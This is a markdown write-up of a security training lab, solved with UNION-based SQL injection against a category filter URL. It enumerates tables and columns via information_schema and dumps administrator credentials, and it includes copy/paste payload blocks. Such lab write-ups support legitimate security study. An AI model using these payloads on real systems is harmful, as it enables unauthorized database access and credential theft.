# SQL injection attack, listing the database contents on non-Oracle databases

A concise write-up using **my original steps** (verbatim) with small, accurate notes and payload blocks.

---

## 🥅 Goal
**Sign in as the administrator** by enumerating tables/columns and extracting credentials via UNION-based SQLi.

---

## ✅ My Exact Steps (Verbatim)

1. **GOAL: sign in as the administrator**

2. **exploring parameters options**

3. **finding that this url param is vulnerable: `/filter?category=Food+%26+Drink'` -> returns 500**

4. **fixing the issue: `/filter?category=Food+%26+Drink'--;`**

5. **It's time to explore how sql even works? how do we understand what tables even exist?**

6. **Download mysql or any similar db (i downloaded xampp) -> lets make some research.**

7. **we found this query wil fetch us results of tables: `/filter?category='+UNION+SELECT+DISTINCT+NULL,table_name+FROM+information_schema.tables+--;`**

8. **our sus table is: `users_ywjavh`**

9. **lets do some research how to fetch columns..**

10. **this is our query: `SELECT column_name FROM information_schema.columns WHERE table_schema = 'bank';`**

11. **but we dont know the schema name, we only have the table name, lets change that**

12. **`SELECT column_name FROM information_schema.columns WHERE table_name = 'id';` -> looks perfect.**

13. **lets use it on our case `'+UNION+SELECT+DISTINCT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name='users_ywjavh'+--;`**

14. **we got two interasting columns: `username_ostvri, password_jvaekv`**

15. **final query: `'+UNION+SELECT+DISTINCT+username_ostvri,password_jvaekv+FROM+users_ywjavh+--;`**

16. **Sign in with creds**

17. **Lab solved.**

---

## 🧠 Minimal Additions (Why / Corrections)

- **UNION rules (MySQL):** The injected `UNION SELECT` must match the **number of columns** (and compatible types) of the original query. Step 7 uses two columns: a **filler** (`NULL`) and the **name to display** (`table_name`). Good.
- **Information schema:**  
  - Tables: `information_schema.tables (table_schema, table_name, ...)`  
  - Columns: `information_schema.columns (table_schema, table_name, column_name, ...)`
  The `WHERE table_name = 'id'` predicate would list columns only for a table **named `id`**, which is likely not intended.
- **Commenting remainder:** In MySQL, `--` is a single-line comment when followed by whitespace. Using `--+` ensures the whitespace (since `+` decodes to space). Alternatives: `#` or `/* ... */`.
- **URL encoding notes:**  
  - `+` = space in query strings.  
  - `%26` is the encoded `&` in `Food+%26+Drink`.  
  - Prefer `%20` for explicit spaces in raw bodies if needed.

---

## 🔧 Payloads I Used (Copy/Paste)

**Discovery & Fix:**
```txt
/filter?category=Food+%26+Drink'
/filter?category=Food+%26+Drink'--+
```

**List tables (two-column UNION):**
```txt
/filter?category='+UNION+SELECT+DISTINCT+NULL,table_name+FROM+information_schema.tables--+
```

**List columns for target table:**
```txt
/filter?category='+UNION+SELECT+DISTINCT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name='users_ywjavh'+--+
```

**Dump creds from target table (adjust column order if needed):**
```txt
/filter?category='+UNION+SELECT+DISTINCT+username_ostvri,password_jvaekv+FROM+users_ywjavh--+
```

> If the app renders the **second column**, flip positions (e.g., `password,username`). Keep the column **count** constant.

---

## 🏁 Result
- Enumerated tables and columns, extracted credentials from the suspected users table, and **signed in as admin**. **Lab Solved. ✅**
